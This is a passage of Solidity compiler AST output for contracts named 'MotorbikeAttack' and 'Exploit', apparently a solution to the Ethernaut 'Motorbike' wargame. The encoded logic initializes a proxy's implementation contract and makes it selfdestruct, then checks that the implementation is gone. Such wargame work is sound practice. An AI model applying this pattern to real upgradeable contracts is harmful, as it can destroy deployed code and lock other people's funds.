memory"}},"id":910,"nodeType":"ExpressionStatement","src":"696:219:5"}]},"documentation":null,"functionSelector":"83197ef0","implemented":true,"kind":"function","modifiers":[],"name":"destroy","overrides":null,"parameters":{"id":885,"nodeType":"ParameterList","parameters":[],"src":"553:2:5"},"returnParameters":{"id":886,"nodeType":"ParameterList","parameters":[],"src":"565:0:5"},"scope":924,"stateMutability":"nonpayable","virtual":false,"visibility":"external"},{"id":923,"nodeType":"FunctionDefinition","src":"928:102:5","nodes":[],"body":{"id":922,"nodeType":"Block","src":"967:63:5","nodes":[],"statements":[{"eventCall":{"argumentTypes":null,"arguments":[{"argumentTypes":null,"arguments":[{"argumentTypes":null,"id":918,"name":"implementation","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":854,"src":"1007:14:5","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"expression":{"argumentTypes":null,"id":916,"name":"Address","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":826,"src":"988:7:5","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Address_$826_$","typeString":"type(library Address)"}},"id":917,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"isContract","nodeType":"MemberAccess","referencedDeclaration":550,"src":"988:18:5","typeDescriptions":{"typeIdentifier":"t_function_internal_view$_t_address_$returns$_t_bool_$","typeString":"function (address) view returns (bool)"}},"id":919,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"988:34:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"id":915,"name":"Check","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":858,"src":"982:5:5","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_bool_$returns$__$","typeString":"function (bool)"}},"id":920,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"982:41:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":921,"nodeType":"EmitStatement","src":"977:46:5"}]},"documentation":null,"functionSelector":"90aa6684","implemented":true,"kind":"function","modifiers":[],"name":"validateItIsBroken","overrides":null,"parameters":{"id":913,"nodeType":"ParameterList","parameters":[],"src":"955:2:5"},"returnParameters":{"id":914,"nodeType":"ParameterList","parameters":[],"src":"967:0:5"},"scope":924,"stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"abstract":false,"baseContracts":[],"contractDependencies":[934],"contractKind":"contract","documentation":null,"fullyImplemented":true,"linearizedBaseContracts":[924],"name":"MotorbikeAttack","scope":935},{"id":934,"nodeType":"ContractDefinition","src":"1034:97:5","nodes":[{"id":933,"nodeType":"FunctionDefinition","src":"1057:72:5","nodes":[],"body":{"id":932,"nodeType":"Block","src":"1088:41:5","nodes":[],"statements":[{"expression":{"argumentTypes":null,"arguments":[{"argumentTypes":null,"expression":{"argumentTypes":null,"id":928,"name":"msg","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-15,"src":"1111:3:5","typeDescriptions":{"typeIdentifier":"t_magic_message","typeString":"msg"}},"id":929,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberName":"sender","nodeType":"MemberAccess","referencedDeclaration":null,"src":"1111:10:5","typeDescriptions":{"typeIdentifier":"t_address_payable","typeString":"address payable"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address_payable","typeString":"address payable"}],"id":927,"name":"selfdestruct","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-21,"src":"1098:12:5","typeDescriptions":{"typeIdentifier":"t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$","typeString":"function (address payable)"}},"id":930,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"names":[],"nodeType":"FunctionCall","src":"1098:24:5","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":931,"nodeType":"ExpressionStatement","src":"1098:24:5"}]},"documentation":null,"functionSelector":"8129fc1c","implemented":true,"kind":"function","modifiers":[],"name":"initialize","overrides":null,"parameters":{"id":925,"nodeType":"ParameterList","parameters":[],"src":"1076:2:5"},"returnParameters":{"id":926,"nodeType":"ParameterList","parameters":[],"src":"1088:0:5"},"scope":934,"stateMutability":"nonpayable","virtual":false,"visibility":"external"}],"abstract":false,"baseContracts":[],"contractDependencies":[],"contractKind":"contract","documentation":null,"fullyImplemented":true,"linearizedBaseContracts":[934],"name":"Exploit","scope":935}],"license":"MIT"},"id":5}